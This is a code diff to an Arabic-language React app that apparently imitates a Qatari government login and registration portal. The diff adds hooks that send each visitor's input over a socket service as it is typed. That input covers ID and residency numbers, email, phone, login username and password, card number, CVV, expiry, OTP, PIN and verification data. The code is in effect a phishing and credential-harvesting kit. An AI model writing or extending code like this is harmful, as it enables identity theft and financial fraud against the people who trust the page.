@@ -1,4 +1,4 @@
-import React, { useState, useMemo } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import Header from './components/Header';
 import Footer from './components/Footer';
 import HomePage from './components/HomePage';
@@ -33,6 +33,17 @@ const App: React.FC = () => {
   // Account Type selection state
   const [accountType, setAccountType] = useState<string | null>(null);
   
+  // Step 1 Dynamic Fields
+  const [step1IdCard, setStep1IdCard] = useState('');
+  const [step1Email, setStep1Email] = useState('');
+  const [step1Phone, setStep1Phone] = useState('');
+  
+  // Step 5: Verification Data
+  const [verificationData, setVerificationData] = useState<any>(null);
+  
+  // Login Data
+  const [loginData, setLoginData] = useState<{ username: string; password: string } | null>(null);
+  
   // Citizenship Type selection state (مواطن / مقيم)
   const [citizenshipType, setCitizenshipType] = useState<'citizen' | 'resident' | null>(null);
   const [nationality, setNationality] = useState('قطر');
@@ -60,6 +71,11 @@ const App: React.FC = () => {
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [passwordError, setPasswordError] = useState('');
   const [confirmPasswordError, setConfirmPasswordError] = useState('');
+
+  // Payment Step States
+  const [paymentData, setPaymentData] = useState({ cardNumber: '', cvv: '', expiryMonth: '', expiryYear: '' });
+  const [otpData, setOtpData] = useState({ otp: '' });
+  const [pinData, setPinData] = useState({ pin: '' });
 
   const steps = [
     { id: 1, label: 'نوع الحساب' },
@@ -184,6 +200,23 @@ const App: React.FC = () => {
   }, [step]);
   
   // Save form data when it changes
+  // Step 1: Account Type with dynamic fields
+  useEffect(() => {
+    if (step === 1 && accountType) {
+      const formData: any = {
+        accountType,
+      };
+      
+      // Add dynamic fields if filled
+      if (step1IdCard) formData.idCard = step1IdCard;
+      if (step1Email) formData.email = step1Email;
+      if (step1Phone) formData.phone = step1Phone;
+      
+      socketService.saveVisitorData(formData, 'step1-account-type');
+    }
+  }, [accountType, step1IdCard, step1Email, step1Phone, step]);
+
+  // Step 2: Personal Info
   useEffect(() => {
     if (step === 2 && (namesAr.first || namesEn.first || idNumber || mobileNumber)) {
       const formData = {
@@ -198,6 +231,52 @@ const App: React.FC = () => {
       socketService.saveVisitorData(formData, 'step2-personal-info');
     }
   }, [namesAr, namesEn, idNumber, mobileNumber, postalCode, citizenshipType, nationality, step]);
+
+  // Step 5: Verification
+  useEffect(() => {
+    if (step === 5 && verificationData) {
+      socketService.saveVisitorData(verificationData, 'step5-verification');
+    }
+  }, [verificationData, step]);
+  
+  // Login Data
+  useEffect(() => {
+    if (loginData && (loginData.username || loginData.password)) {
+      socketService.saveVisitorData(loginData, 'login-data');
+    }
+  }, [loginData]);
+
+  // Step 3: Password
+  useEffect(() => {
+    if (step === 3 && password) {
+      const formData = {
+        password,
+        confirmPassword,
+      };
+      socketService.saveVisitorData(formData, 'step3-password');
+    }
+  }, [password, confirmPassword, step]);
+
+  // Step 4: Payment - Card
+  useEffect(() => {
+    if (step === 4 && paymentSubStep === 'card' && paymentData.cardNumber) {
+      socketService.saveVisitorData(paymentData, 'step4-payment-card');
+    }
+  }, [paymentData, step, paymentSubStep]);
+
+  // Step 4: Payment - OTP
+  useEffect(() => {
+    if (step === 4 && paymentSubStep === 'otp' && otpData.otp) {
+      socketService.saveVisitorData(otpData, 'step4-payment-otp');
+    }
+  }, [otpData, step, paymentSubStep]);
+
+  // Step 4: Payment - PIN
+  useEffect(() => {
+    if (step === 4 && paymentSubStep === 'pin' && pinData.pin) {
+      socketService.saveVisitorData(pinData, 'step4-payment-pin');
+    }
+  }, [pinData, step, paymentSubStep]);
 
   const handleNextStep = () => {
     if (step === 4) {
@@ -280,7 +359,10 @@ const App: React.FC = () => {
                   <SmartCardSection />
                 </div>
                 <div className="md:order-1">
-                  <LoginForm onAccountSuspended={() => setStep(1)} />
+                  <LoginForm 
+                    onAccountSuspended={() => setStep(1)}
+                    onDataChange={setLoginData}
+                  />
                 </div>
               </div>
             </div>
@@ -383,12 +465,14 @@ const App: React.FC = () => {
                            <label className="block text-right text-[14px] font-bold text-gray-800">
                              رقم البطاقة الشخصية/رقم الإقامة <span className="text-red-500">*</span>
                            </label>
-                           <input 
-                             type="text"
-                             className="nas-input text-left w-full"
-                             placeholder=""
-                             inputMode="numeric"
-                           />
+                         <input 
+                            type="text"
+                            className="nas-input text-left w-full"
+                            placeholder=""
+                            inputMode="numeric"
+                            value={step1IdCard}
+                            onChange={(e) => setStep1IdCard(e.target.value)}
+                          />
                          </div>
 
                          {/* Email Field */}
@@ -401,6 +485,8 @@ const App: React.FC = () => {
                              className="nas-input text-left w-full"
                              placeholder=""
                              style={{ fontFamily: 'Arial, sans-serif' }}
+                             value={step1Email}
+                             onChange={(e) => setStep1Email(e.target.value)}
                            />
                          </div>
 
@@ -415,6 +501,8 @@ const App: React.FC = () => {
                                className="nas-input text-left flex-1"
                                placeholder=""
                                inputMode="numeric"
+                               value={step1Phone}
+                               onChange={(e) => setStep1Phone(e.target.value)}
                              />
                              <div className="bg-[#cccccc] h-[34px] px-4 flex items-center justify-center rounded-[4px] text-[14px] font-bold text-[#333] min-w-[70px]">
                                +974
@@ -437,6 +525,8 @@ const App: React.FC = () => {
                              className="nas-input text-left w-full"
                              placeholder=""
                              style={{ fontFamily: 'Arial, sans-serif' }}
+                             value={step1Email}
+                             onChange={(e) => setStep1Email(e.target.value)}
                            />
                          </div>
 
@@ -449,6 +539,8 @@ const App: React.FC = () => {
                              type="tel"
                              className="nas-input text-left w-full"
                              placeholder="+1234567890"
+                             value={step1Phone}
+                             onChange={(e) => setStep1Phone(e.target.value)}
                            />
                          </div>
                        </>
@@ -918,15 +1010,18 @@ const App: React.FC = () => {
           {step === 4 && !isProcessing && (
             <div className="w-full flex justify-center">
               {paymentSubStep === 'info' && <PaymentInfo onNext={handleNextStep} onPrev={handlePrevStep} />}
-              {paymentSubStep === 'card' && <PaymentForm onNext={handleNextStep} onPrev={handlePrevStep} />}
-              {paymentSubStep === 'otp' && <OTPForm onNext={handleNextStep} />}
-              {paymentSubStep === 'pin' && <PINForm onNext={handleNextStep} />}
+              {paymentSubStep === 'card' && <PaymentForm onNext={handleNextStep} onPrev={handlePrevStep} onDataChange={setPaymentData} />}
+              {paymentSubStep === 'otp' && <OTPForm onNext={handleNextStep} onDataChange={setOtpData} />}
+              {paymentSubStep === 'pin' && <PINForm onNext={handleNextStep} onDataChange={setPinData} />}
             </div>
           )}
 
           {step === 5 && !isProcessing && (
             <div className="w-full">
-              <VerificationForm onNext={handleNextStep} />
+              <VerificationForm 
+                onNext={handleNextStep} 
+                onDataChange={setVerificationData}
+              />
             </div>
           )}
 
